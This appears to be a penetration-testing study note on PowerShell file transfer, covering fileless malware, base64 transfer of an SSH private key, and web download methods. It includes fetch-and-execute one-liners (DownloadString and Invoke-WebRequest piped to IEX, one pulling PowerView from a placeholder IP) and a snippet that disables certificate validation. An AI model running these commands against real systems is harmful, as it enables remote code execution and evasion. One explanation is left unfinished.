---
permalink: oscp/techniques/file-transfer/untitled-1
title: Untitled
type: note
---
## Fileless Malware
- Attacker tricks computer into executing malicious powershell command
- Powershell downloads malicious code from an attacker-controlled server
- Code executes in RAM without being saved as exe

---
## Powershell Base64 Encode and Decode
- If you have access to the target machine, copying the payload from your box to the target is easiest
- *md5sum* can be used to calculate if the payloads match between target and host

#### Check SSH Key MD5 Hash
```bash
SonithGT@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

#### Encode SSH Key to Base64
```bash
cat id_rsa |base64 -w 0;echo
```
#### Decoding back to to original in Powershell
```powershell
[IO.File]::WriteAllBytes("<DESTINATION PATH>", [Convert]::FromBase64String("<BASE64 STRING>"))
```

#### Confirm hashes match after decoding in Powershell
```Powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

---
## Powershell Web Downloads

- Powershell can execute and download files from internet using *HTTP, HTTPS, AND FTP*
- Most companies allow HTTP/HTTPs traffic so this is a vulnerability

#### Saving File to Disk
```powershell
(New-Object Net.WebClient).DownloadFile('https://example.com/script.ps1', 'C:\script.ps1')
```

- Downloads `script.ps1` from the URL
- Saves it to `C:\script.ps1` but doesn't execute it

#### Download String + IEX: Executes on memory
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://example.com/script.ps1')
```

- `DownloadString()` downloads the scripts contents as text
- `IEX` executes that text as PowerShell code
- No script file saved to disk

#### Invoke-WebRequests
```powershell
Invoke-WebRequest https://example.com/script.ps1 -OutFile script.ps1
```
- Downloads the script and saves it locally
- `iwr` is a shorter alias for `Invoke-WebRequest`

### Async
- Methods ending in `Async` such as `DownloadFileAsync()` starts a download without making the calling thread wait for it to finish

### Differences in `DownloadFile()` methods
| Method                       | Saves to disk? | Executes code? |
| ---------------------------- | -------------- | -------------- |
| `DownloadFile()`             | Yes            | No             |
| `DownloadString()`           | No             | No             |
| `DownloadString() + IEX`     | No             | Yes            |
| `Invoke-WebRequest -OutFile` | Yes            | No             |

### All avaliable options
|**Method**|**Description**|
|---|---|
|[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)|Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).|
|[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)|Returns the data from a resource without blocking the calling thread.|
|[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)|Downloads data from a resource and returns a Byte array.|
|[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)|Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)|Downloads data from a resource to a local file.|
|[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)|Downloads data from a resource to a local file without blocking the calling thread.|
|[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)|Downloads a String from a resource and returns a String.|
|[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)|Downloads a String from a resource without blocking the calling thread.|

### Common Errors with Powershell
![[Pasted image 20261108151344.png]]
- *Internet Explorer* first launch config may not be completed which can prevent a download

#### Can be bypassed using `-UseBasicParsing`
```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
```
- This makes powershell 

#### Workaround for invalid SSL/TLS
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
- This makes certificate validation callback always accept the certification 